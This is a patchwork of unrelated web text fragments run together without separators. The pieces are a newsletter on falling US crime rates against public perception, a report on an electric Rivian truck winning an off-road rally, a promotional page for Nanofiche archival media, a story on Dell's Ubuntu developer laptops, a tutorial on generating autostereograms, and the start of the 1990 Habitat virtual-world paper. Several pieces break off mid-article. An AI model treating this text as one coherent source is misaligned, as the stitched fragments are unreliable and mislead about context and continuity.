The disruption caused by a <a href="https://www.latimes.com/world-nation/story/2020-09-22/200000-coronavirus-deaths-in-us">deadly pandemic</a>, a <a href="https://www.latimes.com/world-nation/story/2020-03-15/coronavirus-pandemic-gun-sales-surge-us-california">record increase in the availability of guns</a>, a pullback of policing in some cities and perhaps other factors combined to create a surge in homicides and other crimes.</p><p>That national tide has started to recede, but public perception has not kept pace.</p><div data-click="enhancement" data-align-right=""> <ps-newsletter-module data-id="43" data-module-id="0000016f-686e-de6f-a77f-ed6fa300000c"><div>  <p>Get our Essential Politics newsletter</p>  </div>  <p>The latest news, analysis and insights from our politics team.</p>    <p> You may occasionally receive promotional content from the Los Angeles Times.</p>  </ps-newsletter-module> </div><p>That continues to color the nation’s political debates even as reality increasingly diverges from the rhetoric.</p><h2 id="a-historic-decline">A historic decline</h2>
<p>Let’s start with the numbers.</p><p>The <a href="https://cde.ucr.cjis.gov/LATEST/webapp/#/pages/explorer/crime/crime-trend" target="_blank">FBI’s annual report on the nation’s crime</a> statistics showed a 6% decline in homicides in 2022. The drop exceeded what most crime experts expected, said <b>Jeff Asher</b>, a crime data analyst and consultant whose <a href="https://www.ahdatalytics.com/" target="_blank">AH Datalytics’ site</a> is a widely cited source of information.</p><p>The FBI data, which the bureau compiled from reports filed by 18,888 local police departments, lags nearly a year behind reality. Asher, who puts together data from departments that cover a large majority of the nation’s population, says that so far this year, homicides nationwide have declined 11% to 12%. </p><p>Cities tend to report first and have larger drops than more-rural areas, Asher noted, so he’s projecting the final, nationwide 2023 numbers will show a smaller drop — somewhere between 7% and 10%.</p><p>“A 10% decline would be the largest ever recorded,” he said.</p><p>The decline goes beyond homicides: Violent crime overall ticked down in 2022 across the country, the FBI numbers showed, returning the U.S. pretty much to the level of 2019, before the COVID-19-era increase.</p><p>That’s consistent with the pattern of the last dozen years. Despite some fluctuations, violent crime nationwide has stayed largely at the same level since 2011, when it hit a plateau after 20 years of steady declines.</p><p>That doesn’t mean all categories of crime have declined. Auto thefts, for example, have soared in many parts of the country, in part because of a wave of social media videos publicizing easy <a href="https://www.latimes.com/california/story/2023-05-19/hyundai-kia-reach-settlement-on-vehicles-vulnerable-to-tiktok-theft-challenge">ways to steal Kia and Hyundai cars</a>.</p><p>But “the concept of a violent crime wave — it just really doesn’t exist,” Asher said.</p><h2 id="california-declines-similar-to-u-s">California declines similar to U.S.</h2>
<p>The numbers in California are similar to the national ones: In 2022, the state saw a 6.1% drop in homicides although it had a <a href="https://www.ppic.org/publication/crime-trends-in-california/?utm_source=ppic&amp;utm_medium=email&amp;utm_campaign=epub" target="_blank">5.7% increase in violent crime</a> overall compared with the preceding year, according to data from the Public Policy Institute of California.</p><p>In <a href="https://www.latimes.com/california/story/2023-10-12/violent-crime-is-down-fear-is-up-why-is-la-perceived-as-dangerous">Los Angeles, violent crime has declined</a> nearly 7% so far this year compared with last year, according to Los Angeles Police Department statistics. The city has experienced 1,650 fewer incidents reported as of Sept. 30, the numbers show.</p><p>The public perception is very different. Gallup, for example, has surveyed Americans every fall for years about crime. Last year’s survey found that by <a href="https://news.gallup.com/poll/1603/crime.aspx" target="_blank">56%-28%, Americans said crime had increased</a> in their area. </p><p>That’s almost always true. More Americans said crime increased than decreased in all but four of the last 24 years, Gallup found — the exceptions being 2000, 2001, 2004 and 2018. That was true despite the huge decline in crime nationwide that began in 1991, when crime peaked, and continued through 2011 for violent crime and through 2020 for property crimes.</p><h2 id="anecdotes-shape-perception">Anecdotes shape perception</h2>
<p>Why the gap between perception and reality?</p><p>The power of anecdote explains much of it: In a country of nearly 340 million people, some crime takes place every hour, every day. Those incidents stick in people’s minds, especially when the details are grisly. Vivid stories have far more power than dry numbers to shape how people view their world. And in the social media era, crimes anywhere can be just a click away.</p><p>“Every time there’s a smash-and-grab, it just amplifies in people’s minds that crime’s out of control,” said pollster <b>David Paleologos</b>, director of the Suffolk University polling center, which has <a href="https://www.suffolk.edu/academics/research-at-suffolk/political-research-center/polls/cityview-polls" target="_blank">surveyed residents of many of the country’s major cities</a>.</p><p>Anecdotes have even greater impact when they’re fresh and crime statistics aren’t. Unlike economic statistics, which arrive monthly in real time, the U.S. system for reporting crime data, first set up in the 1930s, remains antiquated and slow. By the time the government reports the data, it’s often too old to inform national debates.</p><p>The localized nature of most crime plays a role too. In any year, whatever the national trend, some city probably will have an uptick in crime — often without a clear cause. This year, for example, Washington, D.C., has suffered a sharp increase in killings, in marked contrast to the nationwide decline. San Francisco has experienced a heavily publicized <a href="https://www.latimes.com/california/story/2023-10-07/san-francisco-police-launches-crackdown-on-retail-crime">rash of retail burglaries</a>. News tends to focus on the unusual, not the routine, so those outliers get disproportionate attention.</p><h2 id="politics-amplifies-fears">Politics amplifies fears</h2>
<p>And, of course, “part of what causes the gap between perception and reality is politics,” said Democratic pollster and strategist <b>Anna Greenberg,</b> whose firm has conducted several studies on public attitudes toward crime.</p><p>Even when crime is declining nationwide, some people live in unsafe neighborhoods and have very real fears about being victimized. Black women, for example, many of whom live in urban neighborhoods with high crime rates, are among the groups who rank crime highest on their list of priorities.</p><p>They’re not, however, the voters who most often back policies traditionally seen as tough on crime — longer sentences, for example, or expanded police powers. Those voters — generally older, conservative and white — often live in relatively low-crime areas. When polled, they frequently rate their own neighborhoods as safe but say crime is rampant elsewhere.</p><p>There’s an obvious racial subtext for many of those voters’ concerns about crime. But race isn’t the only factor. For many voters, worries about crime reflect a concern about “a sense of disorder and chaos” in the world, Greenberg said.</p><p>“That doesn’t come out of nowhere. We’ve been in a very unsettling period in our country,” she added.</p><p>There’s evidence, however, that even if public perceptions of crime remain at odds with reality, voters are less prone to support “lock them up” as a solution.</p><p>Research that Greenberg’s firm has done for Vera Action, a liberal research and advocacy organization, suggests that Democrats often can <a href="https://www.gqrr.com/wp-content/uploads/2023/09/Vera-TrueLine-national-memo-9.18.23-proofed_final-2.pdf" target="_blank">counter Republican messages on crime</a> by stressing their support for measures like expanded mental health treatment and getting guns off the street.</p><p>“A more comprehensive, prevention focus is more popular than just punishing your way out of the problem,” Greenberg said.</p><p>Electoral experience backs up that claim. After the <a href="https://www.latimes.com/world-nation/story/2021-05-21/complete-coverage-death-of-george-floyd-and-trial-of-derek-chauvin">killing of <b>George Floyd</b></a><b> </b>in 2020, when some Democrats on the left embraced <a href="https://www.latimes.com/politics/story/2020-06-08/biden-visits-george-floyd-family-trump-meets-with-police">calls to “defund the police,</a>” Republicans stepped up efforts to tag Democrats as soft on crime. Despite widespread worry among Democratic elected officials, however, that effort fell far short of its goal in both 2020 and 2022, including in the Los Angeles mayoral election, in which <b>Rick Caruso</b> <a href="https://www.latimes.com/california/story/2022-09-21/2022-california-election-los-angeles-mayoral-debate-bass-caruso">leaned heavily on concerns about crime and homelessness</a> in his unsuccessful campaign. </p><p>If that’s true when voters think crime is on the upswing, just imagine what might happen if the country begins noticing that it’s on the way down.</p><div data-click="enhancement" data-border-top="" data-module-id="0000016f-686f-d233-abef-fbff3e3b0008" data-align-left="">    <p>Enjoying this newsletter?

				<p id="speakable-summary"><span>Motorsports and off-road</span> competition isn’t the typical fodder over here at TechCrunch — unless, of course, there also happens to be a podium-winning team driving an all-electric 2023 Rivian R1T.</p>
<p>The <a href="https://www.rebellerally.com/?playlist=66d89f6&amp;video=559d83d" target="_blank" rel="noopener">Rebelle Rally</a>, the longest off-road map-and-compass rally in the United States, wrapped up Friday evening with a new EV milestone under its belt. This was the first time that a team driving an all-electric vehicle (that would be the Rivian R1T) came in first place. The Rebelle Rally, in which all-women teams competed along a 2,120-kilometer course using only paper maps, compasses, and plotters, is in its eighth year.</p>
<p>The <a href="https://techcrunch.com/2021/09/28/first-drive-rivian-delivers-the-electric-truck-weve-been-waiting-for/" target="_blank" rel="noopener">2023 Rivian R1T</a>, with Lilly Macaruso behind the wheel and Alex Anderson behind the compass and map, took first place in the 4×4 class. (An EV has yet to make the podium in the X Cross class.) Macaruso and Anderson, who are both Rivian employees, came in fourth place in the 2022 Rebelle Rally. This year, in another first, Rivian customer, Many Brezina, took her personally owned R1T in the competition. Brezina, and navigator Alex Gilman, finished 11th.</p>

<p>The Rivian R1T, which Anderson and Macaruso playfully nicknamed ‘Timmy,’ is actually considered a bone stock, meaning nothing aside from tires were changed on the vehicle that would affect its performance. However, Macaruso and Anderson, both of whom work Rivian, made a number of modifications to the interior to keep them organized during the event.</p>
<p>Anderson, a senior mechanical engineer at <a href="https://techcrunch.com/tag/rivian/" target="_blank" rel="noopener">Rivian</a>, designed a number of items that her co-workers helped bring to life, including inserts for secure storage of a five-gallon water jug, encasing the interior of the A piller with velcro and fabricating mounts for a shovel and fire extinguisher. Anderson also 3D printed an upper cup holder that hooked onto the center console and a lower tray that sat just below it.</p>
<p>“All of these little changes added up for us,” Anderson said after the Rebelle Rally concluded.</p>
<h2>Proving ground</h2>
<p>The Rebelle has also become a proving ground of sorts for Rivian.</p>
<p>Rivian first came on the Rebelle scene in 2020 when <a href="https://techcrunch.com/author/emme-hall/" target="_blank" rel="noopener">Emme Hall</a>, who is also an automotive journalist and contributor at TechCrunch, drove a pre-production version of the R1T. Rivian has sponsored a team every year since. The EV startup turned publicly traded company has used its experience at Rebelle Rally to workshop ideas and fine tune technology and features that eventually make their way into vehicles that consumers own.</p>
<p>While Rivian engineers told me that <a href="https://stories.rivian.com/software-update-soft-sand-mode" target="_blank" rel="noopener">“sand mode”</a> was always the plan, feedback from Hall as well as Rivian employees who have competed in Rebelle helped the company perfect the drive mode. Rivian’s 2022 Rebelle teams were instrumental in final validation of the software build, according to the company.</p>
<p>The latest example can be found in Rivian’s new 2023.38.0 software.

<p>The Rebelle Rally brings competitors far from established charging stations or gas stations, for that matter. Rebelle has partnered with companies like Pennzoil for gas and Renewable Innovations for green hydrogen. What does green hydrogen have to do with charging an EV?</p>
<p>Renewable Innovations has been providing DC fast chargers for the race since 2020. But until this year, the company used diesel generators to power up the chargers. The intention, Rebelle Rally founder Emily Miller told TechCrunch, was always to use hydrogen.</p>
<p>“The biggest challenge was the EV infrastructure,” Miller told TechCrunch at the finish line of Rebelle Rally 2023.</p>
<p>It took years to find the right partner, build out the infrastructure and secure the 800 kilograms of green hydrogen required for the 10-day event, she added.</p>
<p>Today, there are four charge points available to competitors. These chargers are trailered out to spots along the course for teams driving EVs.</p>

            <description><![CDATA[<p>URL: <a href="https://www.archmission.org/nanofiche">https://www.archmission.org/nanofiche</a>, See on <a href="https://news.ycombinator.com/item?id=37978483">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-block-type="2" id="block-5c211236596558cd04a7">
  <h3><strong>Nanofiche: Space-Age Archival Storage</strong></h3><p>The Arch Mission Foundation chose a new technology — nickel based films of Nanofiche™ — for the Arch Lunar Library.™ </p><p>We chose Nanofiche because it is ideally suited to preserving large amounts of analog format information in the harsh environment of space and the surface of the Moon.</p><p>When it comes to preserving data in extreme environments, such as outer space, the surfaces and atmospheres of planets, or underground or underwater, there really is no alternative to Nanofiche today.  </p><p>There is no other archival technology that we know of that is space-grade, lightweight, highly durable and efficient, and ready for prime-time today. Nanofiche is the only viable solution for these scenarios. </p><h3><strong>What is Nanofiche?</strong></h3><p>Nanofiche is a new analog archival preservation media that overcomes the limitations of existing technologies. </p><p>Unlike other alternatives, nickel-based Nanofiche never degrades and never has to be replaced. </p><p>Nickel does not oxidize, has no half-life, and can withstand electromagnetic radiation, high heat, extreme cold, and exposure to the elements, microbes, and many types of chemicals, for thousands of years or longer on Earth. </p><p>Nanofiche can also store up to 2,000 analog pages of text at 150 dpi, per square centimeter. </p><p>For example a 20 x 20 mm nickel Nanofiche sheet can hold up to 8,000 pages of text rendered at 150 dpi. </p><p><em>At this resolution, a letter size page of Nanofiche would hold up to 1.2 million analog images and pages of text!</em></p><p>If the content to be preserved contains photos, then the output must be rendered at double the resolution (300 dpi) to reduce pixelation and increase image quality. Because photos are rendered to Nanofiche in grayscale diffusion dithers, it effectively reduces the capacity to from 1.2 million images, to 300,000 analog images, per letter size sheet of Nanofiche. </p><p>For greater image quality, at 600 dpi, Nanofiche can still hold an impressive 150,000 analog images of pages and photos, per single 8.5”*11” sheet.</p><p>It also worth noting that Nanofiche primarily stores data in analog format, but can also be used to encode digital data for archival preservation as well — either as analog images of digital bitmaps, or in native digital formats (such as DVD format).</p><h3><strong>how long does Nanofiche last? </strong></h3><p>The Pyramids and the hieroglyphics they contain are still readable, thousands of years after being built and abandoned. But, ironically, for all our advances, our civilization’s records are far more delicate than those of ancient civilizations that used stone and metal to capture their knowledge.</p><p>If there was a national or global catastrophe, the majority of our knowledge and data would be immediately inaccessible, and then gone without a trace in 50 years or less. Within a few decades to a few hundred years after such an event, all our paper records would decay as well, leaving only dust.</p><h3><strong>The Ephemerality of The Digital Age</strong></h3><p>The digital data that our present-day civilization  depends on is stored in, and accessed with,  plastic and other unstable materials. These materials oxidize and decay in only a few decades or less, or even faster if exposed to water, chemicals, or extreme temperatures.  </p><p>The computer equipment and electronic devices that power the world - from phones to the server farms that drive the Internet and all major corporations and governments, are also highly vulnerable to electromagnetic radiation. In the event of a major solar storm, or an EMP attack, nuclear blast, or high energy cosmic energy burst, anything not protected by military-grade shielding would be lost.</p><p>And then there are all the ordinary risks, like loss of power, power surges, fires, floods, and other natural disasters that can destroy or prevent use of our information technologies and storage media.</p><p>In short, our digitally-dependent civilization’s  technologies make it increasingly vulnerable to a variety of risks. </p><h3><strong>Microfiche: 1960’s Archival</strong></h3><p>The only sure-fire way to guarantee that important information can be recovered in the event of a catastrophic event, is to back it up with specialized archival media that are designed to survive and be recoverable, even without access to computers and electronics.</p><p>The preferred technology for critical long-term backups is analog archival storage. However, today nearly all such storage uses an decades-old film-based media called microfiche. </p><p>Microfiche is a fragile, film-based media, invented in 1961, that stores data as optical images on film — literally, tiny photographs.</p><p>Microfiche is created using camera systems and retrieved using mechanical optical microfiche readers that, if you are over 30, you may have encountered in a library when you were in school. </p><p><br><strong>The weaknesses of Microfiche</strong></p><p>While microfiche is certainly more durable than any form of paper or magnetic media, and even most optical media, it is delicate, perishable, costly to maintain, and takes up far more physical space than Nanofiche. </p><p>Microfiche is sensitive to environmental conditions and must be carefully maintained. It is vulnerable to humidity, heat, and water damage. It requires HVAC to maintain a proper temperature and humidity environment to preserve it. Sustained loss of power that disables HVAC, or damage from natural disasters such as floods, can result in total loss or damage that requires costly replacement or salvage operations.</p><p>Microfiche has a life expectancy of 400 to 800 years, if maintained continuously under ideal conditions. However most State Archives only certify microfiche for 25 to 50 years, after which point a new copy of the media must be generated to be certain that records are preserved. .</p><p>Microfiche is also not very space efficient compared to today’s digital media. Microfiche typically stores 0.4 pages per square centimeter. A typical sheet or card of microfiche is 3” x 5” or 9 x 12 cm and contains 40 pages of text, with a reduction equivalent of about 25 times. </p><p>A letter size format sheet of microfiche would hold only about 250 pages of text, compared to up to 1.2 million pages of text in Nanofiche. While there are some forms of microfiche that can store slightly more pages per sheet, they are not widely used and are still not comparable to Nanofiche’s capacity.</p><p>Due to the dual necessities of HVAC and replacement, and the physical space requirements of microfiche storage, and the need for old-fashioned microfiche readers, the total cost-of ownership of microfiche grows with time</p><h3><strong>Who Makes Nanofiche?</strong></h3><p>Nanofiche is a new medium, that is only supplied by a single vendor. </p><p>Nanofiche is a patented, proprietary product of Stamper Technology, under license from NanoIP. </p><p>The technology underlying Nanofiche is based on the inventions and technology of Arch Mission Foundation Chief Scientist, Bruce Ha, a senior research scientist who invented the technology for PictureCD technology while at Kodak. </p><p><strong>WHAT ARE THE&nbsp; NICKEL NANOFICHE SPECIFICATIONS?</strong></p><p>• Deep blue laser technology optically reduced to a 100nm focus point.</p><p>• Text at 0.003 point size can be printed at 1,000 pages per minute lithographically per printer.</p><p>• Size of each character of text is 1 micron, or the size of a bacillus bacterium. A page fits within the width of a human hair. </p><p>• 1.2 million pages of 200 dpi images or text can fit on a single 8.5 inch * 11 inch letter-sized sheet of Nanofiche.</p><p>• The master is written to glass at 300,000 dpi and then is electro deposited into nickel.</p><p>• Elemental nickel has melting point of 2,651 F.</p><p>• Los Alamos environmentally tested writing on nickel at high temperature (570 F) and found no degradation up to the longest test time of 65h as measured by SEM at 20,000X.</p><p>• Longevity of engraved content expected to last billions of years, if undisturbed, for example, in outer space. On the surface of the Moon, we project 50 million years or longer (depending on how it is protected). On the surface of the Earth, at least 10,000 years (or up to millions of years if below the surface).</p><p>• Every page is encoded with diffractive security features as a special flag as well.</p><p>• Covered by US patents 8717650, 8264757, 7961367, 7830573<br></p>

Many users, especially developers -- including Linus Torvalds -- love it. As Torvalds recently said, "Normally, I wouldn't name names, but I'm <a href="https://www.zdnet.com/article/look-whats-inside-linus-torvalds-latest-linux-development-pc/" rel="follow">making an exception for the XPS 13</a> just because I liked it so much that I also ended up buying one for my daughter when she went off to college."&nbsp;</p><p>So, how did Dell -- best known for&nbsp;<a href="https://www.zdnet.com/article/best-laptop/" rel="follow">good-quality, mass-produced PCs</a> -- end up building top-of-the-line&nbsp;<a href="https://ubuntu.com/" target="_blank" rel="noopener noreferrer nofollow">Ubuntu Linux</a>&nbsp;laptops? Well, Barton George, Dell Technologies' Developer Community manager, shared the "Project Sputnik"&nbsp;  story this week in a presentation at the popular Linux and open-source community show,&nbsp;<a href="https://2023.allthingsopen.org/" target="_blank" rel="noopener noreferrer nofollow">All Things Open</a>.</p><p><strong>Also: <a href="https://www.zdnet.com/article/best-linux-laptop/" rel="follow">The best Linux laptops (and why you might want one)</a></strong></p><p>First, however, you should know that Dell has supported Linux desktops and laptops since the middle 2000s. In 2006, Michael Dell told me that&nbsp;<a href="https://practical-tech.com/2006/03/08/dell-opens-up-about-desktop-linux/" target="_blank" rel="noopener noreferrer nofollow">Dell would be the first major PC vendor to release and support desktop Linux</a>&nbsp;-- and this proved to be a success.&nbsp;</p><p>George explained that Dell had always done great volume with these computers. Not volume, like the Windows machines, of course, but enough that Dell has always offered Linux-based -- primarily&nbsp;<a href="https://www.redhat.com/en/technologies/linux-platforms/enterprise-linux" target="_blank" rel="noopener noreferrer nofollow">Red Hat Enterprise Linux (RHEL)</a>&nbsp;powered --&nbsp; workstations. &nbsp;</p><!----><p>Still, none of these machines really appealed to developers. George explained:</p><blockquote><p>&nbsp;"Back in 2011, a group of us were trying to figure out how Dell could become more relevant to developers. Dell wasn't a big thing in developers' minds, and we decided it would be a good idea to get developers to change their minds and to think of Dell as a company they wanted to work with."&nbsp;</p></blockquote><p>This notion had been sparked by a conversation between Dell and Stephen O'Grady, co-founder of the developer-centric analyst firm <a href="https://redmonk.com/" target="_blank" rel="noopener noreferrer nofollow">RedMonk</a>. Barton recalled O'Grady suggesting it would be great for developers "if you took one of your laptops, put Ubuntu on it, and just got it to work. We said that's an awesome idea, but it'll never happen, because we're talking about Dell. Our laptops need to deliver huge volumes and revenue. When I talked to one of our higher-ups about the volumes that we thought we would sell, he said, 'Yeah, that's what we sell in Belgium on Tuesday, between three and four in the afternoon.'"&nbsp;</p><p>Despite this disheartening evaluation, when Dell started an in-house innovation fund, Barton pitched it again. This time, he was granted $40,000 to pursue the idea. "This was enough to get going," George recalled. "So, first thing, we put together an official team. But none of us were full-time on this. We got approval from their managers to work on this officially, but it was sort of in our spare time." At times, George said, "The project staff was two people and a dog."</p><p><strong>Also: <a href="https://www.zdnet.com/article/best-linux-desktops-for-beginners/" rel="follow">The best Linux distros for beginners</a></strong></p><p>George approached Google and Amazon: "'Here's what we're trying to do,' he related his pitch. 'Does this look like something you'd be interested in?' And so while they didn't place an order there for 10,000 units, they didn't laugh me out of the room, either." It was enough to prove there was a business case for a developer-focused Ubuntu Linux laptop. &nbsp;</p><p>During that same period, George announced on his personal blog what Dell was planning, and his traffic went from 60 views a day to 15,000. Then, as now, there's a lot of interest in laptops that come with Linux ready to go.&nbsp;</p><p>After all that, the team wanted to ensure they did it right. This wouldn't just be a case of dumping a distro on a machine and hoping for the best. You can do that today and have an excellent chance of everything working perfectly. In 2013? Not so much.&nbsp;</p><p>George added, "We created a rough image that people could use on the XPS 13. Developers could download it and start working on it. We told people there were a&nbsp; lot of caveats, and it wasn't an official release nor supported. But the key thing here is while you couldn't do this with consumers, with developers -- who knew it was a beta-- then you're okay. And, we had most of the bugs worked out. The biggest one was the touchpad, which somebody described as 'craptastic'."</p><p><strong>Also: <a href="https://www.zdnet.com/article/linux-might-be-your-best-bet-for-heightening-your-desktop-computer-security/" rel="follow">Linux might be your best bet for heightening your desktop computer security</a></strong></p><p>So, Dell got together with <a href="https://canonical.com/" target="_blank" rel="noopener noreferrer nofollow">Canonical</a>, Ubuntu Linux's parent company, to make sure all the drivers were in place for a top-notch Ubuntu Linux developer desktop experience. Indeed, the name 'Project Sputnik' is a nod to Mark Shuttleworth, Ubuntu founder and Canonical CEO. A decade before the project itself, Shuttleworth had spent eight days orbiting the Earth in a Soviet Soyuz spacecraft. George and the crew decided "Soyuz"&nbsp; didn't have an inspiring ring to it, so the company went with "Sputnik" instead.</p><p>George continued:</p><blockquote><p>&nbsp;"We announced a beta program for the machine with a 10% off offer. We thought, well, we'll probably get 300 people. Instead, we got 6,000. This is where senior management said OK, you've got something real. We went from slides to launch in nine months. That's pretty fast for building a system."</p></blockquote><p>Now, more than a decade later, the <span><a href="https://www.anrdoezrs.net/links/9041660/type/dlg/sid/subid_value/https://www.dell.com/en-us/shop/dell-laptops/xps-13-plus-developer-edition/spd/xps-13-9320-laptop/usexcucto9320rpl01" rel="noopener noreferrer nofollow" target="_blank"><span>Dell XPS 13 line</span><!----></a></span> and other <a href="https://www.dell.com/en-us/search/ubuntu" target="_blank" rel="noopener noreferrer nofollow">other Ubuntu-Linux-powered systems</a> are more popular than ever.

<p>The 1990s! They felt like a wasteland of culture at the time, but looking back, there was hyper color t-shirts, the beginning of mainstream computing and the internet, the height of alternative rock, and of course magic eye pictures.</p>



<p>Unfocus your eyes such that the two dots overlap. A 3D image should emerge!</p>

<p>To make an autostereogram, you need two things:<br>1. <strong>Color Image</strong>: A tileable repeating pattern.  This can also just be “white noise”.<br>2. <strong>Depth Image</strong>: A grey scale depth map, or a black and white mask.  This defines the 3D shape. Brighter pixel values are closer in depth.</p>



<p>For the above, I snagged these two from pintrest.</p>

<p>The image you are making is going to be the width and height of the depth image, but is going to have as many color channels as the color image.</p>



<p>You build the output image row by row, from left to right. To start out, we can just tile the output image with the color image.  The <strong>Output Image</strong> pixel at (x,y) is the <strong>Color Image</strong> pixel at (x % ColorWidth, y % ColorHeight).  That makes a tiled image, which does not have any 3d effect whatsoever:</p>

<p>To get a 3D effect we need to modify our algorithm.  We need to read the <strong>Depth Image</strong> at pixel (x,y) to get a value from 0 to 255.  We divide that by 255 to get a fractional value between 0 and 1.  We then multiply that value by the “maximum offset amount”, which is a tuneable parameter (i set it to 20), to get an offset amount.  This offset is how much we should move ahead in the pattern.</p>



<p>So, instead of <strong>Output Image</strong> pixel (x,y) using the <strong>Color Image</strong> pixel (x % ColorWidth, y % ColorHeight), we are calculating an offset from the <strong>Depth Image</strong> and using the <strong>Color Image</strong> pixel ((x + offset) % ColorWidth, y % ColorHeight).</p>



<p>Doing that, we aren’t quite there.  Some 3D effects are starting to pop out, but it doesn’t look quite right.</p>

<p>In fact, if you use the simpler depth map of the rectangles shown below, you can see the rectangles just fine, but there seems to be holes to the right of them.</p>

<p>What we need to do is not just look into the <strong>Color Image</strong> at an offset location, but that we need to look at the <strong>Output Image</strong> we are building, at an offset location.  Specifically, we need to look at it in the previous color tile repetition. We use the <strong>Output Image</strong> pixel at ((x + offset – ColorWidth), y).</p>



<p>A problem with that though, is that when x is less than ColorWidth, we’ll be looking at a pixel x value that is less than 0 aka out of bounds.  When x &lt; ColorWidth, we should use the <strong>Color Image</strong> pixel instead, using the same formula we had before ((x + offset) % ColorWidth, y % ColorHeight).</p>



<p>That fixes our problem with the simpler squares depth map. The holes to the right are gone.</p>

<p>And it also mostly fixes our “grave” image:</p>

<p>There is one problem remaining with the grave image though. How these images work is that your left eye needs to lined up with an unmodified tile on the left, and your right eye needs to be lined up with a modified tile on the right. The grave image has depth information very close to the left side, which makes that not be possible. To fix this, you can add an extra “empty color tile” on the left.  That makes our image a little bit wider but it makes it work.  This also has the added benefit of centering the depth map, where it previously was shifted to the left a bit.</p>

<p>There we are, we are done!</p>



<h2>Other Details</h2>



<ul>
<li>I found it useful to normalize the greyscale depth map. Some of them don’t use the full 0 to 1 range, which means they aren’t making the most use of the depth available.  Remapping them to 0 to 1 helps that.</li>



<li>Some masks were meant to be binary black or white, but the images i downloaded form the internet had some grey in them (they were .jpg which is part of the problem – lossy compression). Having an option to binarize these masks was useful, forcing each pixel value or 0 or 1, whichever was closer.</li>



<li>The binary masks i downloaded had the part i was interested in being black, with a white background.  I made the code able to invert this, so the interest part would pop out instead of receeding in.</li>



<li>The distance between the helper dots on the images are the width of the <strong>Color Image</strong>.  A wider color image means a person has to work harder to get those dots to overlap, and it may not even be possible for some people (I’m unsure of details there hehe).  I used tile sizes of 128.</li>



<li>It’s hard to make out fine detail from the depth maps.  It seems like larger, coarse features are the way to go, instead of fine details.</li>
</ul>



<h2>More Pictures</h2>



<p>Here is the grave, with a different color texture. I find this one harder to see.</p>

<p>I also tried using blue noise as a <strong>Color Image</strong> but I can’t see the 3d at all, and it isn’t a mystery what the 3d image is.  You can see the repetition of the depth map object from the feedback.  I think it’s interesting that the repetition is needed to make it look right. I have no understanding of why that is, but if you do, please leave a comment!</p>

That won’t be the fastest operation on the GPU, forcing it to serialize pixel processing unless anyone has any clever ideas to help that. Still, it would be pretty neat as a tech demo!</p>

<blockquote>
<p>This paper was presented at The First Annual International Conference
on Cyberspace in 1990. It was published in Cyberspace: First Steps, Michael
Benedikt (ed.), 1990, MIT Press, Cambridge, Mass. </p>
</blockquote>

<h2>Introduction</h2>

<p>Lucasfilm's Habitat was created by Lucasfilm Games, a division of LucasArts
Entertainment Company, in association with Quantum Computer Services, Inc.
It was arguably one of the first attempts to create a very large scale
commercial multi-user virtual environment. A far cry from many laboratory
research efforts based on sophisticated interface hardware and tens of
thousands of dollars per user of dedicated compute power, Habitat is built
on top of an ordinary commercial online service and uses an inexpensive
-- some would say "toy" -- home computer to support user interaction.
In spite of these somewhat plebeian underpinnings, Habitat is ambitious
in its scope. The system we developed can support a population of thousands
of users in a single shared cyberspace. Habitat presents its users with
a real-time animated view into an online simulated world in which users
can communicate, play games, go on adventures, fall in love, get married,
get divorced, start businesses, found religions, wage wars, protest against
them, and experiment with self-government. </p>

<p>The Habitat project proved to be a rich source of insights into the
nitty-gritty reality of actually implementing a serious, commercially viable
cyberspace environment. Our experiences developing the Habitat system,
and managing the virtual world that resulted, offer a number of interesting
and important lessons for prospective cyberspace architects. The purpose
of this paper is to discuss some of these lessons. We hope that the next
generation of builders of virtual worlds can benefit from our experiences
and (especially) from our mistakes. </p>

<p>Due to space limitations, we won't be able to go into as much technical
detail as we might like; this will have to be left to a future publication.
Similarly, we will only be able to touch briefly upon some of the history
of the project as a business venture, which is a fascinating subject of
its own. Although we will conclude with a brief discussion of some of the
future directions for this technology, a more detailed exposition on this
topic will also have to wait for a future article. </p>

<p>The essential lesson that we have abstracted from our experiences with
Habitat is that a cyberspace is defined more by the interactions among
the actors within it than by the technology with which it is implemented.
While we find much of the work presently being done on elaborate interface
technologies -- DataGloves, head-mounted displays, special-purpose rendering
engines, and so on -- both exciting and promising, the almost mystical
euphoria that currently seems to surround all this hardware is, in our
opinion, both excessive and somewhat misplaced. We can't help having a
nagging sense that it's all a bit of a distraction from the really pressing
issues. At the core of <i>our</i> vision is the idea that cyberspace is
necessarily a <i>multiple-participant environment</i>. It seems to us that
the things that are important to the inhabitants of such an environment
are the capabilities available to them, the characteristics of the other
people they encounter there, and the ways these various participants can
affect one another. Beyond a foundation set of communications capabilities,
the technology used to present this environment to its participants, while
sexy and interesting, is a peripheral concern. </p>

<h2>What is Habitat?</h2>

<p>Habitat is a "multi-player online virtual environment" (its
purpose is to be an entertainment medium; consequently, the users are called
"players"). Each player uses his or her home computer as a frontend,
communicating over a commercial packet-switching data network to a centralized
backend system. The frontend provides the user interface, generating a
real-time animated display of what is going on and translating input from
the player into requests to the backend. The backend maintains the world
model, enforcing the rules and keeping each player's frontend informed
about the constantly changing state of the universe. The backend enables
the players to interact not only with the world but with each other. </p>

<p>Habitat was inspired by a long tradition of "computer hacker science
fiction", notably Vernor Vinge's novel, <i>True Names</i> [1], as
well as many fond childhood memories of games of make-believe, more recent
memories of role-playing games and the like, and numerous other influences
too thoroughly blended to pinpoint. To this we add a dash of silliness,
a touch of cyberpunk [2,3], and a predilection for object-oriented programming
[4]. </p>

<p>The initial incarnation of Habitat uses a Commodore 64 for the frontend.
One of the questions we are asked most frequently is, "Why the Commodore
64?" Many people somehow get the impression that this was a technical
decision, but the real explanation has to do with business, not technology.
Habitat was initially developed by Lucasfilm as commercial product for
QuantumLink, an online service (then) exclusively for owners of the Commodore
64. At the time we started (1985), the Commodore 64 was the mainstay of
the recreational computing market. Since then it has declined dramatically
in both its commercial and technical significance. However, when we began
the project, we didn't get a choice of platforms. The nature of the deal
was such that both the Commodore 64 for the frontend and the existing QuantumLink
host system (a brace of Stratus fault-tolerant minicomputers) for the backend
were givens. </p>

<p>The largest part of the screen is devoted to the graphics display. This
is an animated view of the player's current location in the Habitat world.
The scene consists of various objects arrayed on the screen, such as the
houses and tree you see here. The players are represent by animated figures
that we call "Avatars". Avatars are usually, though not exclusively,
humanoid in appearance. In this scene you can see two of them, carrying
on a conversation. </p>

<p>Avatars can move around, pick up, put down and manipulate objects, talk
to each other, and gesture, each under the control of an individual player.
Control is through the joystick, which enables the player to point at things
and issue commands. Talking is accomplished by typing on the keyboard.
The text that a player types is displayed over his or her Avatar's head
in a cartoon-style "word balloon". </p>

